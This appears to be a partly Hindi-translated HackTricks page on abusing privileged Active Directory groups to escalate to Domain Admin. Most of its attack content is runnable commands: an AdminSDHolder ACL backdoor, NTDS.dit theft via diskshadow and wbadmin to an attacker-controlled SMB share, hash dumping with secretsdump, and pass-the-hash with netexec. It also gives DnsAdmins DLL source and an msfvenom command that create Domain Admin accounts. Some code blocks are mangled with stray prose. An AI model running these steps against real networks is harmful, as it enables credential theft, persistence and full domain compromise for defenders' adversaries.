# विशेषाधिकार प्राप्त समूह

{{#include ../../banners/hacktricks-training.md}}

## प्रशासनिक विशेषाधिकार वाले प्रसिद्ध समूह

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

यह समूह डोमेन पर administrators न होने वाले खातों और समूहों को बनाने का अधिकार रखता है। इसके अतिरिक्त, यह Domain Controller (DC) पर स्थानीय लॉगिन सक्षम करता है।

इस समूह के सदस्यों की पहचान के लिए, निम्नलिखित कमांड चलाई जाती है:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Adding new users is permitted, as well as local login to the DC.

## AdminSDHolder group

**AdminSDHolder** group's Access Control List (ACL) महत्वपूर्ण है क्योंकि यह Active Directory के सभी "protected groups", जिनमें उच्च-विशेषाधिकार समूह भी शामिल हैं, के लिए अनुमतियाँ निर्धारित करती है। यह प्रणाली इन समूहों की सुरक्षा सुनिश्चित करती है और अनधिकृत संशोधनों को रोकती है।

एक हमलावर इसका फायदा उठा सकता है **AdminSDHolder** समूह की ACL को संशोधित करके और एक सामान्य उपयोगकर्ता को पूर्ण अनुमतियाँ देकर। इससे प्रभावी रूप से उस उपयोगकर्ता को सभी "protected groups" पर पूरा नियंत्रण मिल जाएगा। यदि उस उपयोगकर्ता की अनुमतियाँ बदल दी जाती हैं या हटा दी जाती हैं, तो सिस्टम की डिज़ाइन के कारण उन्हें एक घंटे के भीतर स्वचालित रूप से पुनर्स्थापित कर दिया जाएगा।

Commands to review the members and modify permissions include:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
पुनर्स्थापना प्रक्रिया को तेज करने के लिए एक स्क्रिप्ट उपलब्ध है: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

अधिक जानकारी के लिए देखें [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

इस समूह की सदस्यता हटाए गए Active Directory ऑब्जेक्ट्स को पढ़ने की अनुमति देती है, जो संवेदनशील जानकारी प्रकट कर सकते हैं:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### डोमेन कंट्रोलर तक पहुँच

DC पर फ़ाइलों तक पहुँच प्रतिबंधित होती है जब तक कि उपयोगकर्ता `Server Operators` समूह का हिस्सा न हो, जो पहुँच के स्तर को बदल देता है।

### Privilege Escalation

Sysinternals के `PsService` या `sc` का उपयोग करके, कोई सेवा अनुमतियों की जाँच और संशोधन कर सकता है। `Server Operators` समूह, उदाहरण के लिए, कुछ सेवाओं पर पूर्ण नियंत्रण रखता है, जिससे मनमाने कमांड के निष्पादन और Privilege Escalation की अनुमति मिलती है:
```cmd
C:\> .\PsService.exe security AppReadiness
```
यह कमांड दिखाता है कि `Server Operators` के पास पूर्ण पहुंच है, जो सेवाओं को हेरफेर करके उच्च विशेषाधिकार प्राप्त करने में सक्षम बनाती है।

## Backup Operators

`Backup Operators` समूह की सदस्यता `SeBackup` और `SeRestore` privileges के कारण `DC01` फ़ाइल सिस्टम तक पहुँच प्रदान करती है। ये privileges फ़ोल्डर traversal, listing, और फ़ाइल कॉपी करने की क्षमताएँ सक्षम करते हैं, यहाँ तक कि स्पष्ट अनुमतियों के बिना भी, `FILE_FLAG_BACKUP_SEMANTICS` फ़्लैग का उपयोग करके। इस प्रक्रिया के लिए विशिष्ट scripts का उपयोग आवश्यक है।

समूह के सदस्यों को सूचीबद्ध करने के लिए, निष्पादित करें:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### स्थानीय हमला

इन privileges का स्थानीय रूप से लाभ उठाने के लिए, निम्नलिखित चरण अपनाए जाते हैं:

1. आवश्यक libraries आयात करें:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` को सक्षम करें और सत्यापित करें:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. सीमित निर्देशिकाओं से फ़ाइलों तक पहुँचें और उन्हें कॉपी करें, उदाहरण के लिए:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Domain Controller के फ़ाइल सिस्टम तक प्रत्यक्ष पहुँच से `NTDS.dit` डेटाबेस को चोरी किया जा सकता है, जिसमें domain users और computers के सभी NTLM hashes शामिल होते हैं।

#### diskshadow.exe का उपयोग

1. `C` ड्राइव की shadow copy बनाएँ:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. `NTDS.dit` को shadow copy से कॉपी करें:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
वैकल्पिक रूप से, फ़ाइल कॉपी करने के लिए `robocopy` का उपयोग करें:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. हैश प्राप्त करने के लिए `SYSTEM` और `SAM` निकालें:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` से सभी हैश प्राप्त करें:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. निकासी के बाद: DA को Pass-the-Hash
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Using wbadmin.exe

1. हमलावर मशीन पर SMB server के लिए NTFS filesystem सेटअप करें और लक्षित मशीन पर SMB credentials को cache करें।
2. सिस्टम बैकअप और `NTDS.dit` extraction के लिए `wbadmin.exe` का उपयोग करें:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** समूह के सदस्य अपने privileges का उपयोग करके अक्सर Domain Controllers पर होस्ट किए गए DNS server पर SYSTEM privileges के साथ किसी भी मनमाने DLL को लोड कर सकते हैं। यह क्षमता महत्वपूर्ण exploitation potential प्रदान करती है।

DnsAdmins समूह के सदस्यों को सूचीबद्ध करने के लिए, उपयोग करें:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### किसी भी DLL का निष्पादन (CVE‑2021‑40469)

> [!NOTE]
> यह भेद्यता DNS service में SYSTEM privileges के साथ arbitrary code के निष्पादन की अनुमति देती है (आमतौर पर DCs के अंदर)। यह समस्या 2021 में ठीक कर दी गई थी।

सदस्य DNS server को किसी भी DLL (स्थानीय रूप से या किसी remote share से) लोड करा सकते हैं, जैसे निम्नलिखित कमांड्स का उपयोग करके:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL के लोड होने के लिए DNS सेवा को पुनः आरंभ करना (जिसके लिए अतिरिक्त अनुमतियाँ आवश्यक हो सकती हैं) आवश्यक है:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
For more details on this attack vector, refer to ired.team.

#### Mimilib.dll

यह भी संभव है कि mimilib.dll का उपयोग command execution के लिए किया जाए — इसे specific commands या reverse shells चलाने के लिए संशोधित किया जा सकता है। [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### WPAD रिकॉर्ड (MitM के लिए)

DnsAdmins DNS रिकॉर्ड्स को manipulate कर सकते हैं ताकि Man-in-the-Middle (MitM) attacks किए जा सकें — उदाहरण के लिए global query block list को disable करने के बाद WPAD record बनाकर। Tools like Responder or Inveigh spoofing और network traffic capture करने के लिए इस्तेमाल किए जा सकते हैं।

### Event Log Readers
Members event logs तक पहुँच सकते हैं, संभावित रूप से ऐसी संवेदनशील जानकारी पा सकते हैं जैसे plaintext passwords या command execution details:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

यह समूह domain object पर DACLs को संशोधित कर सकता है, जो संभावित रूप से DCSync privileges प्रदान कर सकता है। इस समूह का फायदा उठाकर privilege escalation की तकनीकें Exchange-AD-Privesc GitHub repo में विस्तृत हैं।
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V प्रशासक

Hyper-V प्रशासकों के पास Hyper-V पर पूर्ण पहुँच होती है, जिसका दुरुपयोग virtualized Domain Controllers पर नियंत्रण हासिल करने के लिए किया जा सकता है। इसमें live DCs की cloning और NTDS.dit फ़ाइल से NTLM hashes निकालना शामिल है।

### शोषण उदाहरण

Firefox की Mozilla Maintenance Service का Hyper-V प्रशासक द्वारा दुरुपयोग करके SYSTEM के रूप में कमांड चलाए जा सकते हैं। इसमें एक protected SYSTEM फ़ाइल के लिए hard link बनाना और उसे एक malicious executable से बदलना शामिल है:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Hard link exploitation has been mitigated in recent Windows updates.

## Group Policy Creators Owners

यह समूह सदस्यों को domain में Group Policies बनाने की अनुमति देता है। हालांकि, इसके सदस्य users या groups पर group policies लागू नहीं कर सकते और न ही मौजूदा GPOs को संपादित कर सकते हैं।

## Organization Management

ऐसे वातावरण में जहाँ **Microsoft Exchange** तैनात है, एक विशेष समूह जिसे **Organization Management** कहा जाता है, महत्वपूर्ण क्षमताएँ रखता है। इस समूह को सभी domain users के mailboxes तक पहुंच (access) का अधिकार प्राप्त है और यह 'Microsoft Exchange Security Groups' Organizational Unit (OU) पर पूर्ण नियंत्रण रखता है। इस नियंत्रण में **`Exchange Windows Permissions`** समूह भी शामिल है, जिसका उपयोग privilege escalation के लिए किया जा सकता है।

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** समूह के सदस्यों को कई privileges दिए गए होते हैं, जिनमें **`SeLoadDriverPrivilege`** शामिल है, जो उन्हें **Domain Controller पर locally log on** करने, उसे shut down करने और printers को manage करने की अनुमति देता है। इन privileges को exploit करने के लिए, विशेषकर यदि **`SeLoadDriverPrivilege`** कोई unelevated context में दिखाई नहीं देता, तो User Account Control (UAC) को bypass करना आवश्यक है।

इस समूह के सदस्यों की सूची देखने के लिए, निम्न PowerShell command का उपयोग किया जाता है:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
अधिक विस्तृत exploitation techniques जो **`SeLoadDriverPrivilege`** से संबंधित हैं, के लिए विशिष्ट security resources का संदर्भ लें।

#### रिमोट डेस्कटॉप उपयोगकर्ता

इस समूह के सदस्यों को Remote Desktop Protocol (RDP) के माध्यम से पीसी तक पहुँच प्रदान की जाती है। इन सदस्यों की सूची निकालने के लिए PowerShell कमांड उपलब्ध हैं:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
exploiting RDP के बारे में और जानकारी समर्पित pentesting संसाधनों में मिल सकती है।

#### रिमोट प्रबंधन उपयोगकर्ता

सदस्य **Windows Remote Management (WinRM)** के माध्यम से पीसी तक पहुँच सकते हैं। इन सदस्यों की enumeration निम्न तरीकों से की जाती है:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** से संबंधित exploitation techniques के लिए, विशिष्ट दस्तावेज़ों का संदर्भ लिया जाना चाहिए।

#### सर्वर ऑपरेटर

यह समूह Domain Controllers पर विभिन्न कॉन्फ़िगरेशनों को करने के लिए अनुमतियाँ रखता है, जिसमें बैकअप और पुनर्स्थापना विशेषाधिकार, सिस्टम का समय बदलना और सिस्टम को बंद करना शामिल हैं। सदस्यों की सूची प्राप्त करने के लिए, दिया गया कमांड है:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## संदर्भ <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
